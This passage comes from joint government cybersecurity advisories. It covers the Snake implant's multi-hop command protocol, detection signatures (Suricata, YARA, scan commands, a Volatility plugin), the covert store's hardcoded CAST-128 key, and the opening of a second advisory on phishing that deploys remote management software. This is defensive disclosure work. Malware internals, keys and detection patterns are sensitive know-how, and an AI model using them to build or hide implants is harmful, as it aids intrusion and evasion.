Node, then deleted from Hop Point 1.
(7), (8): The Node attempts another Queue Read to Hop Point 1, however now the Item Type
is set to 0x21, one greater than the command that was just read in by the Node at (5) and (6).
This returns an error as Hop Point 1 has nothing else for the Node to read in, indicating to the
Node that everything at Hop Point 1 was read.
(9), (10): At this point, the Node has executed the command it read in at (5) and (6) and is
attempting to send back the results. The Node randomly selects another host from its stored
communication channels, Hop Point 2 in this case, and sends out a 0xb command to make
sure that the Item Type 0x20, the Item Type of the command it executed, does not already
exist within the Queue of Hop Point 2. If it receives an error, there is no Item with Item Type
0x20 on Hop Point 2, and the Node can proceed to send the command results.
(11), (12): Here the data from the executed command is written to Hop Point 2 with Item Type
0x20 into its 0x1 Container with a 0xc command, the Item Type the command was initially
given at creation (3).
(13), (14): The Node continues its normal beaconing routine again as seen in (1) and (2),
searching for Item Type 0x21, one greater than the Item Type of the most recently executed
MITRE ATT&CK IDs: [T1090.003], [T1104]
The operator knows that Hop Point 1 is stored in the communications channels of the Node, thus the operator knows
that the Node will beacon out to Hop Point 1 at some point and be able to retrieve the data.
Page 33 of 48 | Product ID: AA23-129A
TLP:CLEAR
International Partnership
TLP:CLEAR
command. As in (1) and (2), the lines here are dotted to denote that this process will repeat
until there was a successful beacon as in (5) and (6).
(15-22): These steps show how the operator retrieves the resulting data that was written to
Hop Point 2. The Queue Enumerate command (15) lists the contents of Hop Point 2
s 0x1
Container, showing the data written by the Node (11). This data is identifiable by its Item Type,
namely 0x20. The Queue Read command (17) reads in the Item that was found in Hop Point
s Container. The Queue Read command that follows (19) is asking if there is any data left. In
this case, the entirety of the data was read with the first Queue Read (17, 18). Therefore, the
error returned from second Queue Read command (20) lets the operator know all of the data
from Item Type 0x20 was read and there is nothing further. A Queue Delete command (21)
follows and is sent to delete the item with Item Type 0x20 from Hop Point 2.
The subsequent Queue Read, Queue Read, and Queue Delete commands (17-21) are
denoted with dashed lines to indicate that this sequence of commands is repeated for all items
returned from the Queue Enumerate command (15).
Page 34 of 48 | Product ID: AA23-129A
TLP:CLEAR
International Partnership
TLP:CLEAR
MITIGATIONS
A number of complementary detection techniques effectively identify some of the more recent
variants of Snake. However, as described above, Snake is purpose-built to avoid large-scale
detection. Below is a discussion of the advantages and disadvantages of various detection
methodologies available for Snake.
Note that some of the techniques identified in this section can affect the availability or stability
of a system. Defenders should follow organizational policies and incident response best practices to
minimize the risk to operations while hunting for Snake.
Network-Based Detection
Network Intrusion Detection Systems (NIDS) can feasibly identify some of the more recent variants of
Snake and its custom network protocols as detailed above.
Advantages: High-confidence, large-scale (network-wide) detection of custom Snake communication
protocols.
Disadvantages: Low visibility of Snake implant operations and encrypted data in transit. There is
some potential for false positives in the Snake http, http2, and tcp signatures. Snake operators
can easily change network-based signatures.
Snake http
Snake client-to-server http and http2 traffic is contained within an arbitrary HTTP header field. The
header field value for http begins with 10 pure alphanumeric characters, followed by base64 encoding
of 8 bytes, which yields exactly 11 valid base64 characters plus one base64 padding character.
^[0-9A-Za-z]{10}[0-9A-Za-z/\+]{11}=
The following two Suricata rules will detect the traffic described:
alert http any any -> any any (msg: "http rule (Cookie)";\
pcre:"/[0-9A-Za-z]{10}[0-9A-Za-z\/\+]{11}=/C";\
flow: established, to_server;\
sid: 7; rev: 1;)
alert http any any -> any any (msg: "http rule (Other Header)";\
pcre:"/[0-9A-Za-z]{10}[0-9A-Za-z\/\+]{11}=/H";\
flow: established, to_server;\
sid: 8; rev: 1;)
Snake http2
The header field value for http2 begins with 22 pure alphanumeric characters (base62 with nonextraneous characters), followed by the base62 encoding of at least 8 bytes, which must comprise at
least 11 base62 characters with the four extraneous characters allowed. The actual requirement is
Page 35 of 48 | Product ID: AA23-129A
TLP:CLEAR
International Partnership
TLP:CLEAR
stricter than this expression, since the total number of non-extraneous characters alone must equal or
exceed 11; however, it is not possible to encode that aspect into a regular language.
^[0-9A-Za-z]{22}[0-9A-Za-z/;_=]{11}
The following two Suricata rules will detect the traffic described:
alert http any any -> any any (msg: "http2 rule (Cookie)";\
pcre:"/[0-9A-Za-z]{22}[0-9A-Za-z\/_=\;]{11}/C";\
flow: established, to_server;\
sid: 9; rev: 1;)
alert http any any -> any any (msg: "http2 rule (Other Header)";\
pcre:"/[0-9A-Za-z]{22}[0-9A-Za-z\/_=\;]{11}/H";\
flow: established, to_server;\
sid: 10; rev: 1;)
Snake tcp
The client-to-server communication for tcp must begin with the ustart, which is not captured in this
signature set. Immediately following the ustart, the next client-to-server communication must be the
big-endian 32-bit unsigned integer 8 followed by any 8 bytes of data. The next communication must
also be client-to-server, and it must comprise the big-endian 32-bit unsigned integer 4 followed by any
4 bytes of data. The next two communications must be server-to-client, comprising the integer 8
followed by 8 bytes of data and the integer 4 followed by 4 bytes of data.
The following six Suricata rules will, in conjunction, detect traffic of the form described:
alert tcp any any -> any any (msg: "tcp rule";\
content: "|00 00 00 08|"; startswith; dsize: 12;\
flow: established, to_server; flowbits: set, a8; flowbits: noalert;\
sid: 1; rev: 1;)
alert tcp any any -> any any (msg: "tcp rule";\
content: "|00 00 00 04|"; startswith; dsize:8;\
flow: established, to_server; flowbits: isset, a8; flowbits: unset, a8;\
flowbits: set, a4; flowbits: noalert;\
sid: 2; rev: 1;)
alert tcp any any -> any any (msg: "tcp rule";\
content: "|00 00 00 08|"; startswith; dsize: 4;\
flow: established, to_client; flowbits: isset, a4; flowbits: unset, a4;\
flowbits: set, b81; flowbits: noalert;\
sid: 3; rev: 1;)
Page 36 of 48 | Product ID: AA23-129A
TLP:CLEAR
International Partnership
TLP:CLEAR
alert tcp any any -> any any (msg: "tcp rule";\
dsize: 8; flow: established, to_client; flowbits: isset, b81;\
flowbits: unset, b81; flowbits: set, b8; flowbits: noalert;\
sid: 4; rev: 1;)
alert tcp any any -> any any (msg: "tcp rule";\
content: "|00 00 00 04|"; startswith; dsize: 4;\
flow: established, to_client; flowbits: isset, b8; flowbits: unset, b8;\
flowbits: set, b41; flowbits: noalert;\
sid: 5; rev: 1;)
alert tcp any any -> any any (msg: "tcp rule";\
dsize: 4; flow: established, to_client; flowbits: isset, b41;\
flowbits: unset, b41;\
sid: 6; rev: 1;)
Host-Based Detection
Advantages: High confidence based on totality of positive hits for host-based artifacts.
Disadvantages: Many of the artifacts on the host are easily shifted to exist in a different location or
with a different name. As the files are fully encrypted, accurately identifying these files is difficult.
Covert Store Detection
The Snake covert store comprises a file-backed NTFS (usually) or FAT-16 (rarely) filesystem. The
filesystem is encrypted with CAST-128 in CBC mode. The encryption key can be either statically
hardcoded or dynamically stored in a specified Windows registry location. The IV is 8 bytes, since
CAST-128 has an 8-byte block length. The first byte of the IV for any 512-byte block of the covert
store is the 0-indexed block number. The remaining bytes of the IV are the corresponding bytes of the
key, meaning that bytes at 0-indexed indices 1 through 7 of the IV are the bytes at 0-indexed indices
1 through 7 of the key.
When statically hardcoded, the encryption key has the following constant value:
A1 D2 10 B7 60 5E DA 0F A1 65 AF EF 79 C3 66 FA
When stored in the Windows registry, the encryption key is the classname associated with the
following key:
SECURITY\Policy\Secrets\n
The following initial 8-byte sequences are known to be used by NTFS or FAT-16 filesystems as
observed:
EB 52 90 4E 54 46 53 20
EB 5B 90 4E 54 46 53 20
Page 37 of 48 | Product ID: AA23-129A
TLP:CLEAR
International Partnership
TLP:CLEAR
EB 3C 90 4D 53 44 4F 53
EB 00 00 00 00 00 00 00
For tool development, the following test vector illustrates the encryption of the first given header
above (EB 52 90 
) using CAST-128 with the default key shown above and the IV constructed as
described, given this header occurs at the beginning of the first 512-byte block of the covert store.
Plaintext:
EB 52 90 4E 54 46 53 20
Key:
A1 D2 10 B7 60 5E DA 0F A1 65 AF EF 79 C3 66 FA
00 D2 10 B7 60 5E DA 0F
Ciphertext:
C2 C7 F4 CA F7 DA 3A C8
By encrypting each possible initial filesystem byte sequence with CAST-128 using the key obtained
from the registry
or the default encryption key if the registry entry does not exist
and searching for
any file with a size that is an even multiple of 220, it is possible to efficiently detect Snake covert
stores. Validation can be performed by decrypting the entire file using the outlined methodology and
then verifying that it comprises an NTFS or FAT-16 filesystem.
Other On-Disk Artifact Detection
Registry Blob
The registry blob is generally found at the location listed below. In case it is not present at its typical
location, the registry blob can be found by searching the full registry for a value of at least 0x1000
bytes in size and entropy of at least 7.9.
Typical Name: Unknown (RegBlob)
Typical Path: HKLM\SOFTWARE\Classes\.wav\OpenWithProgIds
Characteristics: High Entropy
Queue File
Typical Name: < RANDOM_GUID >.<RANDOM_GUID>.crmlog
Typical Path: %windows\registration\
Unique Characteristics: High Entropy, file attributes of hidden, system, and archive
Role: Snake Queue File
The Snake Queue File generally has a predictable path and filename structure, in addition to being
high entropy. The Snake Queue File can be located by scanning all files in the typical queue path with
filenames matching a regular expression that captures the typical naming convention. Files meeting
these criteria should be scanned for high entropy, which is performed by the Yara rule below:
rule HighEntropy
Page 38 of 48 | Product ID: AA23-129A
TLP:CLEAR
International Partnership
TLP:CLEAR
meta:
description = "entropy rule"
condition:
math.entropy(0, filesize) >= 7.0
The following UNIX find command will scan files with names matching the GUID-based convention
(note that the HighEntropy yara rule is assumed to be contained in a file named 
1.yar
find /PATH/TO/WINDOWS_DIR -type f -regextype posix-egrep -iregex \
'.*\/registration/(\{[0-9A-F]{8}\-([0-9A-F]{4}\-){3}[0-9A-F]{12}\}\.){2}crmlog' \
-exec yara 1.yar {} \;
The following PowerShell command does the same:
Get-ChildItem -Recurse -File -Path %WINDOWS% | Where-Object {
$_.FullName -match
'(?i)/registration/(\{[0-9A-F]{8}\-([0-9A-F]{4}\-){3}[0-9A-F]{12}\}\.){2}crmlog$'
} | ForEach-Object {
yara 1.yar $_.FullName
Comadmin
Typical Name: comadmin.dat
Typical Path: %windows%\system32\Com
Unique Characteristics: High Entropy
Role: Houses Snake
s kernel driver and the driver
s loader
The Snake Comadmin file can be found using analogous techniques to that presented above for
locating the Snake Queue File. The following UNIX find command will do so:
find /PATH/TO/WINDOWS -type f -regextype posix-egrep -iregex \
'.*\/system32/Com/comadmin\.dat' \
-exec yara 1.yar {} \;
The following PowerShell command does the same:
Get-ChildItem -Recurse -File -Path %WINDOWS% | Where-Object {
$_.FullName -match '(?i)/system32/Com/comadmin\.dat$'
} | ForEach-Object {
yara 1.yar $_.FullName
Page 39 of 48 | Product ID: AA23-129A
TLP:CLEAR
International Partnership
TLP:CLEAR
Werfault
Typical Name: Werfault.exe
Typical Path: %windows%\WinSxS\x86_microsoft-windowserrorreportingfaults_31bf3856ad364e35_4.0.9600.16384_none_a13f7e283339a0502\
Unique Characteristics: Icon is different than that of a valid Windows Werfault.exe file
Role: Persistence mechanism
The Snake Werfault.exe file has non-standard icon sizes, which form the basis of the Yara rule below.
This rule should be run on all files in the typical path, specifically the %Windows%\WinSxS directory.
rule PeIconSizes
meta:
description = "werfault rule"
condition:
pe.is_pe
for any rsrc in pe.resources:
(rsrc.type == pe.RESOURCE_TYPE_ICON and rsrc.length == 3240)
for any rsrc in pe.resources:
(rsrc.type == pe.RESOURCE_TYPE_ICON and rsrc.length == 1384)
for any rsrc in pe.resources:
(rsrc.type == pe.RESOURCE_TYPE_ICON and rsrc.length == 7336)
Memory Analysis
Advantages: High confidence as memory provides the greatest level of visibility into Snake
behaviors and artifacts.
Disadvantages: Potential impact on system stability, difficult scalability.
Capturing and analyzing the memory of a system will be the most effective approach in detecting
Snake because it bypasses many of the behaviors that Snake employs to hide itself. With a memory
analysis tool, such as Volatility, detection of a Snake compromise may be possible.
Page 40 of 48 | Product ID: AA23-129A
TLP:CLEAR
TLP:CLEAR
International Partnership
Snake
s principal user mode component is injected into a chosen process via a single allocation of
PAGE_EXECUTE_READWRITE memory. The starting offset is generally 0x20000000, however the
module does allow for relocation if needed. Additionally, since the user mode component is not
obfuscated in any way, a valid PE header can be located at the beginning of the allocated memory
region. Further validation can be performed by confirming the presence of strings known to exist in
the user mode component also within the memory region. A plugin compatible with Volatility3 which
can scan all processes on a system using this method is provided in the Appendix. A screenshot
showing the results of the plugin successfully detecting Snake is displayed below.
Page 41 of 48 | Product ID: AA23-129A
TLP:CLEAR
TLP:CLEAR
International Partnership
PREVENTION
Note that the mitigations that follow are not meant to protect against the initial access vector and are
only designed to prevent Snake
s persistence and hiding techniques.
Change Credentials and Apply Updates
System owners who are believed to be compromised by Snake are advised to change their
credentials immediately (from a non-compromised system) and to not use any type of passwords
similar to those used before. Snake employs a keylogger functionality that routinely returns logs back
to FSB operators. Changing passwords and usernames to values which cannot be brute forced or
guessed based on old passwords is recommended.
System owners are advised to apply updates to their Operating Systems. Modern versions of
Windows, Linux, and MacOS make it much harder for adversaries to operate in the kernel space. This
will make it much harder for FSB actors to load Snake
s kernel driver on the target system.
Execute Organizational Incident Response Plan
If system owners receive detection signatures of Snake implant activity or have other indicators of
compromise that are associated with FSB actors using Snake, the impacted organization should
immediately initiate their documented incident response plan.
We recommend implementing the following Cross-Sector Cybersecurity Performance Goals (CPGs)
to help defend against FSB actors using Snake, or mitigate negative impacts post-compromise:
CPG 2.A: Changing Default Passwords will prevent FSB actors from compromising default
credentials to gain initial access or move laterally within a network.
CPG 2.B: Requiring Minimum Password Strength across an organization will prevent FSB actors
from being able to successfully conduct password spraying or cracking operations.
CPG 2.C: Requiring Unique Credentials will prevent FSB actors from compromising valid accounts
through password spraying or brute force.
CPG 2.E Separating User and Privileged Accounts will make it harder for FSB actors to gain
access to administrator credentials.
CPG 2.F. Network Segmentation to deny all connections by default unless explicitly required for
specific system functionality, and ensure all incoming communication is going through a properly
configured firewall.
CPG 2.H Implementing Phishing Resistant MFA adds an additional layer of security even when
account credentials are compromised and can mitigate a variety of attacks towards valid accounts, to
include brute forcing passwords and exploiting external remote services software.
CPG 4.C. Deploy Security.txt Files to ensure all public facing web domains have a security.txt file
that conforms to the recommendations in RFC 9118.
Page 42 of 48 | Product ID: AA23-129A
TLP:CLEAR
International Partnership
TLP:CLEAR
APPENDIX
Partnership
This advisory was developed as a joint effort by an international partnership of multiple agencies in
furtherance of the respective cybersecurity missions of each of the partner agencies, including our
responsibilities to develop and issue cybersecurity specifications and mitigations. This partnership
includes the following organizations:
Federal Bureau of Investigation
National Security Agency
Cybersecurity and Infrastructure Security Agency
Cyber National Mission Force
The United Kingdom
s National Cyber Security Centre
Canadian Centre for Cyber Security
Communications Security Establishment
Australian Cyber Security Centre
New Zealand National Cyber Security Centre
Collectively, we use a variety of sources, methods, and partnerships to acquire information about
foreign cyber threats. This advisory contains the information we have concluded can be publicly
released, consistent with the protection of sources and methods and the public interest.
Disclaimer
The information in this report is being provided 
as is
 for informational purposes only. We do not
endorse any commercial product or service, including any subjects of analysis. Any reference to
specific commercial products, processes, or services by service mark, trademark, manufacturer, or
otherwise, does not constitute or imply endorsement, recommendation, or favoring by co-authors.
MITRE ATT&CK Techniques
This advisory uses the MITRE ATT&CK
 for Enterprise framework, version 13. See MITRE ATT&CK
for Enterprise for all referenced tactics and techniques. MITRE and ATT&CK are registered trademarks
of The MITRE Corporation. This report references the following MITRE ATT&CK techniques.
Technique Title
Network Connection
Enumeration
T0840
Adversaries may perform network connection enumeration to
discover information about device communication patterns.
Data Obfuscation
T1001
Adversaries may obfuscate command and control traffic to make
it more difficult to detect.
Protocol Impersonation
T1001.003
Adversaries may impersonate legitimate protocols or web service
traffic to disguise command and control activity and thwart
analysis efforts.
Page 43 of 48 | Product ID: AA23-129A
TLP:CLEAR
International Partnership
TLP:CLEAR
OS Credential Dumping
T1003
Adversaries may attempt to dump credentials to obtain account
login and credential material, normally in the form of a hash or a
clear text password, from the operating system and software.
Rootkit
T1014
Adversaries may use rootkits to hide the presence of programs,
files, network connections, services, drivers, and other system
components.
Obfuscated Files or
Information
T1027
Adversaries may attempt to make an executable or file difficult to
discover or analyze by encrypting, encoding, or otherwise
obfuscating its contents on the system or in transit.
Software Packing
T1027.002
Adversaries may perform software packing or virtual machine
software protection to conceal their code.
Masquerading
T1036
Adversaries may attempt to manipulate features of their artifacts
to make them appear legitimate or benign to users and/or
security tools.
Network Sniffing
T1040
Adversaries may sniff network traffic to capture information about
an environment, including authentication material passed over
the network.
Network Service Discovery
T1046
Adversaries may attempt to get a listing of services running on
remote hosts and local network infrastructure devices, including
those that may be vulnerable to remote software exploitation.
Dynamic-link Library
Injection
T1055.001
Adversaries may inject dynamic-link libraries (DLLs) into
processes in order to evade process-based defenses as well as
possibly elevate privileges.
Keylogging
T1056.001
Adversaries may log user keystrokes to intercept credentials as
the user types them.
PowerShell
T1059.001
Adversaries may abuse PowerShell commands and scripts for
execution.
Application Layer Protocol
T1071
Adversaries may communicate using OSI application layer
protocols to avoid detection/network filtering by blending in with
existing traffic.
Web Protocols
T1071.001
Adversaries may communicate using application layer protocols
associated with web traffic to avoid detection/network filtering by
blending in with existing traffic.
Mail Protocols
T1071.003
Adversaries may communicate using application layer protocols
associated with electronic mail delivery to avoid
detection/network filtering by blending in with existing traffic.
T1071.004
Adversaries may communicate using the Domain Name System
(DNS) application layer protocol to avoid detection/network
filtering by blending in with existing traffic.
Page 44 of 48 | Product ID: AA23-129A
TLP:CLEAR
International Partnership
TLP:CLEAR
Data Staged
T1074
Adversaries may stage collected data in a central location or
directory prior to Exfiltration.
Valid Accounts
T1078
Adversaries may obtain and abuse credentials of existing
accounts as a means of gaining Initial Access, Persistence,
Privilege Escalation, or Defense Evasion.
File and Directory
Discovery
T1083
Adversaries may enumerate files and directories or may search in
specific locations of a host or network share for certain
information within a file system.
Multi-hop Proxy
T1090.003
To disguise the source of malicious traffic, adversaries may chain
together multiple proxies.
Non-Application Layer
Protocol
T1095
Adversaries may use an OSI non-application layer protocol for
communication between host and C2 server or among infected
hosts within a network.
Multi-Stage Channels
T1104
Adversaries may create multiple stages for command and control
that are employed under different conditions or for certain
functions.
Native API
T1106
Adversaries may interact with the native OS application
programming interface (API) to execute behaviors.
Modify Registry
T1112
Adversaries may interact with the Windows Registry to hide
configuration information within Registry keys, remove
information as part of cleaning up, or as part of other techniques
to aid in persistence and execution.
Automated Collection
T1119
Once established within a system or network, an adversary may
use automated techniques for collecting internal data.
Data Encoding
T1132
Adversaries may encode data to make the content of command
and control traffic more difficult to detect.
Non-Standard Encoding
T1132.002
Adversaries may encode data with a non-standard data encoding
system to make the content of command and control traffic more
difficult to detect.
Network Share Discovery
T1135
Adversaries may look for folders and drives shared on remote
systems as a means of identifying sources of information to
gather as a precursor for Collection and to identify potential
systems of interest for Lateral Movement.
Deobfuscate/Decode Files
or Information
T1140
Adversaries may use Obfuscated Files or Information to hide
artifacts of an intrusion from analysis.
Exploit Public-Facing
Application
T1190
Adversaries may attempt to exploit a weakness in an Internetfacing host or system to initially access a network.
Page 45 of 48 | Product ID: AA23-129A
TLP:CLEAR
International Partnership
TLP:CLEAR
Domain Trust Discovery
T1482
Adversaries may attempt to gather information on domain trust
relationships that may be used to identify lateral movement
opportunities in Windows multi-domain/forest environments.
Installer Packages
T1546.016
Adversaries may establish persistence and elevate privileges by
using an installer to trigger the execution of malicious content.
Dynamic Linker Hijacking
T1547.006
Adversaries may execute their own malicious payloads by
hijacking environment variables the dynamic linker uses to load
shared libraries.
Inter-Process
Communication
T1559
Adversaries may abuse inter-process communication (IPC)
mechanisms for local code or command execution.
Archive Collected Data
T1560.003
An adversary may compress and/or encrypt data that is collected
prior to exfiltration.
Hide Artifacts
T1564
Adversaries may attempt to hide artifacts associated with their
behaviors to evade detection.
Service Execution
T1569.002
Adversaries may abuse the Windows service control manager to
execute malicious commands or payloads.
Lateral Tool Transfer
T1570
Adversaries may transfer tools or other files between systems in
a compromised environment.
Protocol Tunneling
T1572
Adversaries may tunnel network communications to and from a
victim system within a separate protocol to avoid
detection/network filtering and/or enable access to otherwise
unreachable systems.
Encrypted Channel
T1573
Adversaries may employ a known encryption algorithm to conceal
command and control traffic rather than relying on any inherent
protections provided by a communication protocol.
Symmetric Cryptography
T1573.001
Adversaries may employ a known symmetric encryption algorithm
to conceal command and control traffic rather than relying on any
inherent protections provided by a communication protocol.
Asymmetric Cryptography
T1573.002
Adversaries may employ a known asymmetric encryption
algorithm to conceal command and control traffic rather than
relying on any inherent protections provided by a communication
protocol.
DLL Side-Loading
T1574.002
Adversaries may execute their own malicious payloads by sideloading DLLs.
Compromise Infrastructure
T1584
Adversaries may compromise third-party infrastructure that can
be used during targeting.
Malware
T1587.001
Adversaries may develop malware and malware components that
can be used during targeting.
Page 46 of 48 | Product ID: AA23-129A
TLP:CLEAR
International Partnership
TLP:CLEAR
Obtain Capabilities
T1588
Adversaries may buy and/or steal capabilities that can be used
during targeting.
Stage Capabilities
T1608
Adversaries may upload, install, or otherwise set up capabilities
that can be used during targeting.
Deploy Container
T1610
Adversaries may deploy a container into an environment to
facilitate execution or evade defenses.
Volatility Plugin
The following plugin for the Volatility memory analysis framework will scan all processes on the
system until it finds the Snake user mode component injected into a process. If found, the plugin will
list both the injected process and the virtual memory address at which the Snake user mode
component is loaded.
# This plugin to identify the injected usermode component of Snake is based
# on the malfind plugin released with Volatility3
# This file is Copyright 2019 Volatility Foundation and licensed under the
# Volatility Software License 1.0
# which is available at https://www.volatilityfoundation.org/license/vsl-v1.0
import logging
from typing import Iterable, Tuple
from volatility3.framework import interfaces, symbols, exceptions, renderers
from volatility3.framework.configuration import requirements
from volatility3.framework.objects import utility
from volatility3.framework.renderers import format_hints
from volatility3.plugins.windows import pslist, vadinfo
vollog = logging.getLogger(__name__)
class snake(interfaces.plugins.PluginInterface):
_required_framework_version = (2, 4, 0)
@classmethod
def get_requirements(cls):
return [
requirements.ModuleRequirement(name = 'kernel',
description = 'Windows kernel',
architectures = ["Intel32", "Intel64"]),
requirements.VersionRequirement(name = 'pslist',
component = pslist.PsList, version = (2, 0, 0)),
requirements.VersionRequirement(name = 'vadinfo',
component = vadinfo.VadInfo, version = (2, 0, 0))]
@classmethod
def list_injections(
cls, context: interfaces.context.ContextInterface,
kernel_layer_name: str, symbol_table: str,
proc: interfaces.objects.ObjectInterface) -> Iterable[
Tuple[interfaces.objects.ObjectInterface, bytes]]:
proc_id = "Unknown"
try:
Page 47 of 48 | Product ID: AA23-129A
TLP:CLEAR
International Partnership
TLP:CLEAR
proc_id = proc.UniqueProcessId
proc_layer_name = proc.add_process_layer()
except exceptions.InvalidAddressException as excp:
vollog.debug("Process {}: invalid address {} in layer {}".
format(proc_id, excp.invalid_address, excp.layer_name))
return
proc_layer = context.layers[proc_layer_name]
for vad in proc.get_vad_root().traverse():
protection_string = vad.get_protection(vadinfo.VadInfo.
protect_values(context, kernel_layer_name, symbol_table),
vadinfo.winnt_protections)
if not "PAGE_EXECUTE_READWRITE" in protection_string:
continue
if (vad.get_private_memory() == 1
and vad.get_tag() == "VadS") or (vad.get_private_memory()
== 0 and protection_string !=
"PAGE_EXECUTE_WRITECOPY"):
data = proc_layer.read(vad.get_start(),
vad.get_size(), pad = True)
if data.find(b'\x4d\x5a') != 0:
continue
yield vad, data
def _generator(self, procs):
kernel = self.context.modules[self.config['kernel']]
is_32bit_arch = not symbols.symbol_table_is_64bit(self.context,
kernel.symbol_table_name)
for proc in procs:
process_name = utility.array_to_string(proc.ImageFileName)
for vad, data in self.list_injections(self.context,
kernel.layer_name, kernel.symbol_table_name, proc):
strings_to_find = [b'\x25\x73\x23\x31',b'\x25\x73\x23\x32',
b'\x25\x73\x23\x33',b'\x25\x73\x23\x34',
b'\x2e\x74\x6d\x70', b'\x2e\x73\x61\x76',
b'\x2e\x75\x70\x64']
if not all(stringToFind in data for
stringToFind in strings_to_find):
continue
yield (0, (proc.UniqueProcessId, process_name,
format_hints.Hex(vad.get_start()),
format_hints.Hex(vad.get_size()),
vad.get_protection(
vadinfo.VadInfo.protect_values(self.context,
kernel.layer_name, kernel.symbol_table_name),
vadinfo.winnt_protections)))
return
def run(self):
kernel = self.context.modules[self.config['kernel']]
return renderers.TreeGrid([("PID", int), ("Process", str),
("Address", format_hints.Hex), ("Length", format_hints.Hex),
("Protection", str)], self._generator(pslist.PsList.list_processes(
context = self.context, layer_name = kernel.layer_name,
symbol_table = kernel.symbol_table_name)))
Page 48 of 48 | Product ID: AA23-129A
TLP:CLEAR
TLP:CLEAR
Co-authored by:
Product ID: AA23-025A
January 25, 2023
Protecting Against Malicious Use of Remote
Monitoring and Management Software
SUMMARY
The Cybersecurity and Infrastructure Security Agency (CISA), National Security Agency (NSA), and
Multi-State Information Sharing and Analysis Center (MS-ISAC) (hereafter referred to as the
authoring organizations
) are releasing this joint Cybersecurity Advisory (CSA) to warn network
defenders about malicious use of legitimate remote monitoring and management (RMM) software. In
October 2022, CISA identified a widespread cyber campaign involving the malicious use of legitimate
RMM software. Specifically, cyber criminal actors sent phishing emails that led to the download of
legitimate RMM software
ScreenConnect (now ConnectWise Control) and AnyDesk
which the
actors used in a refund scam to steal money from victim bank accounts.
Although this campaign appears financially motivated, the authoring organizations assess it could
lead to additional types of malicious activity. For example, the actors could sell victim account access
to other cyber criminal or advanced persistent threat (APT) actors. This campaign highlights the threat
of malicious cyber activity associated with legitimate RMM software: after gaining access to the target
network via phishing or other techniques, malicious cyber actors
from cybercriminals to nation-state
sponsored APTs
are known to use legitimate RMM software as a backdoor for persistence and/or
command and control (C2).
Using portable executables of RMM software provides a way for actors to establish local user access
without the need for administrative privilege and full software installation
effectively bypassing
common software controls and risk management assumptions.
The authoring organizations strongly encourage network defenders to review the Indicators of
Compromise (IOCs) and Mitigations sections in this CSA and apply the recommendations to protect
against malicious use of legitimate RMM software.
All organizations should report incidents and anomalous activity to CISA
s 24/7 Operations Center at report@cisa.gov or
(888) 282-0870. When available, please include the following information regarding the incident: date, time, and location of
the incident; type of activity; number of people affected; type of equipment used for the activity; the name of the submitting
company or organization; and a designated point of contact. For NSA client requirements or general cybersecurity inquiries,
contact Cybersecurity_Requests@nsa.gov. State, local, tribal, and territorial government entities can also report to the MSISAC (SOC@cisecurity.org or 866-787-4722).
This document is marked TLP:CLEAR. Disclosure is not limited. Sources may use TLP:CLEAR when information carries
minimal or no foreseeable risk of misuse, in accordance with applicable rules and procedures for public release. Subject to
standard copyright rules, TLP:CLEAR information may be distributed without restriction. For more information on the Traffic
Light Protocol, see cisa.gov/tlp/.
TLP:CLEAR
TLP:CLEAR
CISA | NSA | MS-ISAC
For a downloadable copy of IOCs, see AA23-025.stix (STIX, 19 kb).
TECHNICAL DETAILS
Overview
In October 2022, CISA used trusted third-party reporting, to conduct retrospective analysis of
EINSTEIN
a federal civilian executive branch (FCEB)-wide intrusion detection system (IDS)
operated and monitored by CISA
and identified suspected malicious activity on two FCEB networks:
In mid-June 2022, malicious actors sent a phishing email containing a phone number to an
FCEB employee
s government email address. The employee called the number, which led
them to visit the malicious domain, myhelpcare[.]online.
In mid-September 2022, there was bi-directional traffic between an FCEB network and
myhelpcare[.]cc.
Based on further EINSTEIN analysis and incident response support, CISA identified related activity
on many other FCEB networks. The authoring organizations assess this activity is part of a
widespread, financially motivated phishing campaign and is related to malicious typosquatting activity
reported by Silent Push in the blog post Silent Push uncovers a large trojan operation featuring
Amazon, Microsoft, Geek Squad, McAfee, Norton, and Paypal domains.
Malicious Cyber Activity
The authoring organizations assess that since at least June 2022, cyber criminal actors have sent
help desk-themed phishing emails to FCEB federal staff
s personal, and government email
addresses. The emails either contain a link to a 
first-stage
 malicious domain or prompt the recipients
to call the cybercriminals, who then try to convince the recipients to visit the first-stage malicious
domain. See figure 1 for an example phishing email obtained from an FCEB network.
Page 2 of 7 | Product ID: AA23-025A
TLP:CLEAR
TLP:CLEAR
CISA | NSA | MS-ISAC
Figure 1: Help desk-themed phishing email example
The recipient visiting the first-stage malicious domain triggers the download of an executable. The
executable then connects to a 
second-stage
 malicious domain, from which it downloads additional
RMM software.
CISA noted that the actors did not install downloaded RMM clients on the compromised host. Instead,
the actors downloaded AnyDesk and ScreenConnect as self-contained, portable executables
configured to connect to the actor
s RMM server.
Note: Portable executables launch within the user
s context without installation. Because portable
executables do not require administrator privileges, they can allow execution of unapproved software
even if a risk management control may be in place to audit or block the same software
s installation
on the network. Threat actors can leverage a portable executable with local user rights to attack other
vulnerable machines within the local intranet or establish long term persistent access as a local user
service.
Page 3 of 7 | Product ID: AA23-025A
TLP:CLEAR
TLP:CLEAR
CISA | NSA | MS-ISAC
CISA has observed that multiple first-stage domain names follow naming patterns used for IT
help/support themed social-engineering, e.g., hservice[.]live, gscare[.]live,
nhelpcare[.]info, deskcareme[.]live, nhelpcare[.]cc). According to Silent Push, some of
these malicious domains impersonate known brands such as, Norton, GeekSupport, Geek Squad,
Amazon, Microsoft, McAfee, and PayPal.[1] CISA has also observed that the first-stage malicious
domain linked in the initial phishing email periodically redirects to other sites for additional redirects
and downloads of RMM software.
Use of Remote Monitoring and Management Tools
In this campaign, after downloading the RMM software, the actors used the software to initiate a
refund scam. They first connected to the recipient
s system and enticed the recipient to log into their
bank account while remaining connected to the system. The actors then used their access through
the RMM software to modify the recipient
s bank account summary. The falsely modified bank
account summary showed the recipient was mistakenly refunded an excess amount of money. The
actors then instructed the recipient to 
refund
 this excess amount to the scam operator.
Although this specific activity appears to be financially motivated and targets individuals, the access
could lead to additional malicious activity against the recipient
s organization
from both other
cybercriminals and APT actors. Network defenders should be aware that:
Although the cybercriminal actors in this campaign used ScreenConnect and AnyDesk, threat
actors can maliciously leverage any legitimate RMM software.
Because threat actors can download legitimate RMM software as self-contained, portable
executables, they can bypass both administrative privilege requirements and software
management control policies.
The use of RMM software generally does not trigger antivirus or antimalware defenses.
Malicious cyber actors are known to leverage legitimate RMM and remote desktop software as
backdoors for persistence and for C2.[2],[3],[4],[5],[6],[7],[8]
RMM software allows cyber threat actors to avoid using custom malware.
Threat actors often target legitimate users of RMM software. Targets can include managed service
